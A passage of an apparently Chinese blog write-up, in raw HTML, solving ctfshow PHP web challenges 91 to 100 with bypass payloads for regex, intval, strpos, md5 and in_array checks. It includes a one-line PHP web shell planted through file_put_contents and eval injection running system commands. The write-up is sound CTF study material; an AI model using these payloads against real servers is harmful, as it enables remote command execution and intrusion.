class="line">&#125;</span><br></pre></td></tr></table></figure><p>4476后加任意字符即可。<code>?num=4476a</code>。<br>我们默认的上传类型就是字符型，我们直接在末尾添加一个字符就可以。</p><h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><blockquote><p><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">https://blog.csdn.net/qq_46091464/article/details/108278486</a><br><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">show_source(__FILE__);</span><br><span class="line">include(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">$a=$_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, $a))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, $a))&#123;</span><br><span class="line">        echo <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    echo <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个题一上来没看懂，要搞懂他先要理解他的过滤是什么意思。</p><ul><li><code>^</code> “行首”元字符 (^) 仅匹配字符串的开始位置</li><li><code>**$**</code>“行末”元字符 ($) 仅匹配字符串末尾，或者最后的换行符(除非设置了 D 修饰符)</li></ul><p>默认情况下，preg_match函数会认为目标字符串是单行组成的，当目标字符串中有换行符或者匹配中出现^或者$会受到影响。<br>并且末尾的m的意义如下。<br>因此综上意思就是，要求传入内容中有php，但是第一行中没有php。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977422503-fb5ac281-d0e2-4af8-a0ba-db71b32378ad.png" alt="image.png"><br>因此payload：<code>abc%0aphp</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>附PCRE模式修正符</p><blockquote><p>参考文章·：<a href="https://blog.csdn.net/forest_fire/article/details/50944901">https://blog.csdn.net/forest_fire/article/details/50944901</a></p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681977497562-fb227ad1-c636-42ab-8b63-5ef842146ece.png" alt="image.png"></p><p>wp中提到的另一个漏洞：</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html">https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html</a></p></blockquote><h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval()函数如果$base为0则$var中存在字母的话遇到字母就停止读取 但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以。<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span>    <span class="comment">//十六进制</span></span><br><span class="line">?num=<span class="number">010574</span>    <span class="comment">//八进制</span></span><br><span class="line">?num=<span class="number">4476e123</span></span><br></pre></td></tr></table></figure><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>十六进制里面会有字符，但是八进制仍然可以使用。<br>payload：<code>010574</code></p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。这里检测了不让第一位为0。<br>但是这个函数是可以被绕过的，利用<code>%0a</code>、<code>.</code>、<code>+</code>、<code> </code>都可以使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">对于<span class="title function_ invoke__">strpos</span>()函数，我们可以利用换行进行绕过（%<span class="number">0</span>a）</span><br><span class="line">payload:?num=%<span class="number">0</span>a010574</span><br><span class="line">也可以小数点绕过</span><br><span class="line">payload：?num=<span class="number">4476.0</span></span><br><span class="line">因为<span class="title function_ invoke__">intval</span>()函数只读取整数部分</span><br><span class="line">还可以八进制绕过(%<span class="number">20</span>是空格的url编码形式)</span><br><span class="line">payload：?num=%<span class="number">20010574</span></span><br><span class="line">?num= <span class="number">010574</span> <span class="comment">// 前面加个空格</span></span><br><span class="line">?num=+<span class="number">010574</span> </span><br><span class="line">?num=+<span class="number">4476.0</span></span><br></pre></td></tr></table></figure><h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上题payload：<code>num=%20010574</code></p><h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：<code>?u=./flag.php</code>这个./可以表示当前目录</p><h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接用数组绕过：<code>a[]=1&amp;b[]=2</code></p><h2 id="方法二-强碰撞"><a href="#方法二-强碰撞" class="headerlink" title="方法二 强碰撞"></a>方法二 强碰撞</h2><p><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code><br>需要用bp提交。</p><h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html">https://www.php.cn/php-weizijiaocheng-383293.html</a><br><a href="https://www.php.cn/php-notebook-172859.html">https://www.php.cn/php-notebook-172859.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 如果有GET传参，就变成POST传参</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 如果出传入flag的值为flag，将get传参修改为cookie传参</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="comment"># 同理将get转为server</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment"># 如果http_flag的值为flag，则值为flag，否则就是本文件</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以理解为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>;<span class="comment">//只要有输入的get参数就将get方法改变为post方法(修改了get方法的地</span></span><br><span class="line">址)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&quot;flag&quot;</span>;</span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>;</span><br></pre></td></tr></table></figure><p>所以直接num传入一个值，然后将post传入<code>HTTP_FLAG=flag</code>即可<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927233986-f0da9a13-4af2-45df-bc4e-daea53d31a16.png" alt="image.png"></p><h1 id="web99-in-array"><a href="#web99-in-array" class="headerlink" title="web99 in_array"></a>web99 in_array</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以理解为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();<span class="comment">//设置为数组</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));<span class="comment">//向数组里面插入随机数</span></span><br><span class="line">&#125; i</span><br><span class="line"><span class="title function_ invoke__">f</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line"><span class="comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="comment">//写入1.php文件 内容是&lt;?php system($_POST[1]);?&gt;</span></span><br><span class="line">&#125; ?</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>in_array函数的漏洞：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927691590-12a4253b-84b2-416a-b2dc-d066f82cfd04.png" alt="20210125215956454.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682927847639-0305094e-2c71-4bc1-8fa8-18982aa0966f.png" alt="image.png"><br>GET传入：<code>n=1.php</code><br>POST传入：<code>content=&lt;?php system($_POST[1]);?&gt;</code><br>然后就进入1.php，post传入：<code>1=tac fl*</code></p><h1 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1682928476651-4a45d147-98b3-43e1-9f10-b66df6fc9322.png" alt="20210126121456572.png"><br>所以这道题只需要让v1是truev0就是true了，后面都不用管。然后v2使用命令执行即可。<br>payload：<code>?v1=1&amp;v2=system(&#39;ls&#39;)/*&amp;v3=*/;</code><br><code>?v1=1&amp;v2=system(&#39;cat ctf*&#39;)&amp;v3=;</code><br><code>?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</code><br>这个也行。<br>最后要将0x2d要转化成<code>-</code><br>ctfshow{ee9557f4-b67a-4c79-8603-e5653885d260}</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><strong>但是有几个问题，为什么只能使用/</strong>/来注释不能用//，而且不能如下赋值：**<br><code>**?v1=1&amp;v2=system(&#39;cat ctf*&#39;);/*&amp;v3=*/**</code><br><strong>但是神奇的是用写在本地之后运行这种就可以了。</strong></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用反射类<br>payload：<code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code><br>关于反射类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 